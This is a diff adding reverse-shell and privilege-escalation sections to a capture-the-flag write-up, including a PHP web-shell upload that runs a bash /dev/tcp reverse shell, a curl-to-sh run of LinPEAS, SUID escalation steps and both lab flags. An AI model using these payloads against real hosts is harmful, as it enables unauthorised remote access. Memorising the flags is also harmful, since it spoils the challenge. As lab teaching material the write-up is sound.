@@ -224,6 +224,78 @@ drwxrwxr-x 1 root     root     4.0K Feb 27 14:40 ..
 -rwxrwxrwx 1 www-data www-data    0 Feb 27 14:40 index.php
 ```
 
+### Read User Flag
+The flag is located in `/flag` and we can see the file by using command `ls -lah /flag` and we will get response
+```
+total 20K
+drwxr-xr-x 1 root root 4.0K Feb 27 14:44 .
+drwxr-xr-x 1 root root 4.0K Feb 27 14:46 ..
+---------- 1 root root   40 Feb 27 14:40 root.txt
+-rw-rw-r-- 1 root root   40 Feb 27 14:40 user.txt
+```
+read user.txt with `cat /flag/user.txt`
+
+#### FLAG USER: USER{32250170a0dca92d53ec9624f336ca24}
+
+We will not able to read root flag since it has permission
+```
+---------- 1 root root   40 Feb 27 14:40 root.txt
+```
+
 # Post-Exploitation
 ### Reverse Shell
+A reverse shell is a shell that is running on one computer but accepts requests and relays the responses to another computer. So it acts on behalf of another computer remotely. There are various tools for conduct reverse shell, but the most commonly used currently is `nc`.
+
+#### Install Netcat
+```
+sudo apt install nc -y
+```
+
+#### Basic usage of netcat
+We will use flags `-l` and `-p` to do listening port
+```
+nc -lp 1337
+```
+
+#### Payload for reverse shell in Bash
+```
+bash -i >& /dev/tcp/<YOUR IP>/<YOUR LISTEN PORT> 0>&1
+```
+
+Write malicious PHP file just like before but this time we will add the payload in it.
+
+```
+<?php system('bash -c "bash -i >& /dev/tcp/192.168.56.1/1337 0>&1"'); ?>
+```
+
+Upload and open the file and we will got reverse connection
+```
+❯ nc -lp 1337
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@63f5b77af313:/var/www/html/administrator/uploads$
+```
+
 ### Privilege Escalation
+#### Reccon using Linpeas
+LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts. The checks are explained on book.hacktricks.xyz
+- Source: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+We will running this tool by this command
+```
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
+
+We got interesting result in `SUID - Check easy privesc, exploits and write perms` with `You can write SUID file: /bin/bahs`
+
+#### Spawn ROOT
+Based on the information, we can spawn `/bin/bash` by it's owner `UID` which is `root`. and all we need to do is type `bahs` to become `root`.
+
+#### Read Root Flag
+```
+bahs
+cd /flag
+cat root.txt
+```
+
+#### FLAG ROOT: ROOT{bed128365216c019988915ed3add75fb}
